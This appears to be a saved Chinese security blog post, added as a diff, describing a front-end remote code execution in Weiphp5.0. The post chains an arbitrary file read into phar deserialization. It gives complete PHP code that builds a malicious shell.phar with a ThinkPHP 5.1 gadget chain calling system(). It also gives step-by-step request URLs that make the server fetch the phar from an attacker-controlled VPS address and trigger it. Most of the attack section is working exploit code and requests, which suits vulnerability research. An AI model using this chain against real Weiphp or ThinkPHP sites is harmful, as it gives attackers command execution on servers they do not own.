@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Weiphp5.0 前台RCE - typotypo&#39;s blog</title>
+
+  <link rel="icon" href="">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-NFCRR8Q57W"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  </script> -->
+  <script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+  <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-182385326-1');
+    ga('set', 'dimension1', 'site/E2DmFJYwg');
+    ga('set', 'dimension2', 'post/');
+    ga('send', 'pageview');
+    // gtag('set', {
+    //   'custom_map': {
+    //     'dimension1': 'siteId',
+    //     'dimension2': 'postId',
+    //   }
+    // })
+
+    // gtag('config', 'G-NFCRR8Q57W', {
+    //   'siteId': 'site/E2DmFJYwg',
+    //   'postId': 'post/',
+    // });
+  </script>
+
+
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="起初是今天无聊看到了Weiphp5.0 前台文件任意读取
+
+https://mp.weixin.qq.com/s/uKRI-DWEjaILtlWLrKhD3Q
+
+突然想自己复现下，结果跟了下漏洞，发现了RCE
+任意文件读取的步骤是：
+想要读...">
+
+  <meta property="og:title" content="Weiphp5.0 前台RCE - typotypo&#39;s blog">
+  <meta property="og:description" content="起初是今天无聊看到了Weiphp5.0 前台文件任意读取
+
+https://mp.weixin.qq.com/s/uKRI-DWEjaILtlWLrKhD3Q
+
+突然想自己复现下，结果跟了下漏洞，发现了RCE
+任意文件读取的步骤是：
+想要读...">
+  <!-- <meta property="og:image" content="/some-image.png"> -->
+  <meta property="og:url" content="weiphp50-qian-tai-rce/">
+  <meta property="og:site_name" content="typotypo&#39;s blog">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image:alt" content="Weiphp5.0 前台RCE">
+
+  <meta name="gridea:post_id" content="">
+
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@gridea/theme@1.0.4/css/main.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.0.3/styles/a11y-light.css">
+</head>
+<body class="bg-gray-100">
+  <div id="page">
+    <div class="mb-16 sticky top-0 z-20" :class="{
+  'bg-gray-100': !overTop
+}">
+  <header class="py-4 flex items-baseline justify-between max-w-2xl mx-auto px-2">
+    <h1 class="text-xl text-center font-medium px-4 md:px-0">
+      <a href="/">typotypo&#39;s blog</a>
+    </h1>
+    <div class="flex justify-center">
+      
+    </div>
+  </header>
+</div>
+    <div class="border-b border-gray-200">
+      <div class="max-w-2xl mx-auto px-6 md:px-2">
+        <div class="my-24">
+          <h1 class="text-3xl py-4 font-black">Weiphp5.0 前台RCE</h1>
+          <div class="flex ">
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="sticky-bar" class="w-full sticky top-0 z-10 bg-white" style="height: 64px;"></div>
+    <div class="p-4 md:p-16 bg-white">
+      <div class="max-w-2xl mx-auto px-2 flex relative">
+        <section class="post-content flex-1 default-post-content max-w-2xl">
+          <div v-pre>
+            <p>起初是今天无聊看到了<strong>Weiphp5.0 前台文件任意读取</strong></p>
+<blockquote>
+<p>https://mp.weixin.qq.com/s/uKRI-DWEjaILtlWLrKhD3Q</p>
+</blockquote>
+<p>突然想自己复现下，结果跟了下漏洞，发现了RCE</p>
+<p>任意文件读取的步骤是：</p>
+<p>想要读取的文件database.php</p>
+<p>将database.php-&gt;写入图片-&gt;得到图片地址获得database.php内容</p>
+<p><img src="https://static.gridea.dev/286612883891028492/38vFKmVMl.png" alt="" loading="lazy"></p>
+<p>根据上文可以得知，内容是<code>wp_file_get_contents()</code>函数读取<code>$picUrl</code>写入的</p>
+<p>而读取正是用的<code>file_get_contents</code>，这个函数刚好可以触发phar反序列化</p>
+<p>RCE的步骤是:</p>
+<p>将phar写入-&gt;得到phar重命名jpg的地址-&gt;再次写入触发反序列化</p>
+<p>这里我用的是<code>Somnus's blog</code>这位师傅里面的pop链</p>
+<blockquote>
+<p>https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#POP%E9%93%BE%E5%88%86%E6%9E%90</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+namespace think\process\pipes{
+    class Windows
+    {
+        private $files = [];
+
+        public function __construct($files=[])
+        {
+            $this-&gt;files = $files;
+        }
+    }
+}
+
+namespace think\model\concern{
+    trait Conversion
+    {
+        protected $visible = [];
+        protected $relation = [];
+    }
+    trait Attribute
+    {
+        private $data = [];
+        private $withAttr = [];
+    }
+}
+
+namespace think{
+    use think\model\concern\Conversion;
+    use think\model\concern\Attribute;
+    abstract class Model
+    {
+        use Conversion;
+        use Attribute;
+
+        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
+        {
+            $this-&gt;relation = $relation;
+            $this-&gt;visible = $visible;
+            $this-&gt;data = $data;
+            $this-&gt;withAttr = $withAttr;
+        }
+    }
+}
+
+namespace think\model{
+    use think\Model;
+    class Pivot extends Model{
+        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
+        {
+            parent::__construct($relation,$visible,$data,$withAttr);
+        }
+    }
+}
+
+namespace{
+    $relation = array(&quot;system&quot;=&gt;1);
+    $visible = array(&quot;system&quot;=&gt;1);
+    $data = array(&quot;system&quot;=&gt;&quot;whoami&quot;);
+    $withAttr = array(&quot;system&quot;=&gt;&quot;system&quot;);
+    $pivot = new think\model\Pivot($relation,$visible,$data,$withAttr);
+    $windows = new think\process\pipes\Windows(array($pivot));
+    //echo urlencode(serialize($windows));
+    @unlink(&quot;shell.phar&quot;);
+    $phar = new Phar(&quot;shell.phar&quot;); 
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
+    $phar-&gt;setMetadata($windows); 
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); 
+    $phar-&gt;stopBuffering();
+}
+</code></pre>
+<p>一、VPS放置phar文件<br>
+二、写入phar</p>
+<blockquote>
+<p>http://127.0.0.1//public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=http://2.0.2.1/shell.phar</p>
+</blockquote>
+<p><img src="https://static.gridea.dev/286612883891028492/y1YBIsXYE.png" alt="" loading="lazy"><br>
+三、获得phar文件地址</p>
+<blockquote>
+<p>http://127.0.0.1/public/index.php/home/file/user_pics</p>
+</blockquote>
+<p><img src="https://static.gridea.dev/286612883891028492/XT00RHyLd.png" alt="" loading="lazy"><br>
+四、再次写入，触发反序列化，完成RCE</p>
+<blockquote>
+<p>http://127.0.0.1//public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=phar://./../public/uploads/picture/2021-01-17/1610887419600430fb7b7f2.jpg</p>
+</blockquote>
+<p><img src="https://static.gridea.dev/286612883891028492/VXWv0TxIn.png" alt="" loading="lazy"></p>
+<p>嘻嘻😇</p>
+
+          </div>
+          <div class="py-4 text-gray-600 flex items-center justify-between">
+            <div class="">
+              <div class="text-sm text-gray-300">最后更新于: </div>
+              <div class="text-base font-medium">2021-01-17</div>
+            </div>
+            <!-- <div class="flex items-center text-sm text-gray-600">
+              <i class="ri-eye-line"></i> <span class="ml-2">{{ views }}</span>
+            </div> -->
+          </div>
+          <div>
+            <div id="disqus_thread"></div>
+          </div>
+        </section>
+        
+      </div>
+    </div>
+    <div class="py-8 text-gray-300 text-center border-t border-gray-200">
+  Powered by Gridea
+</div>
+  </div>
+
+  <script src="//cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+  <script src="//cdn.jsdelivr.net/npm/@gridea/theme@1.0.4/js/main.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.0.0/build/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+</body>
+</html>
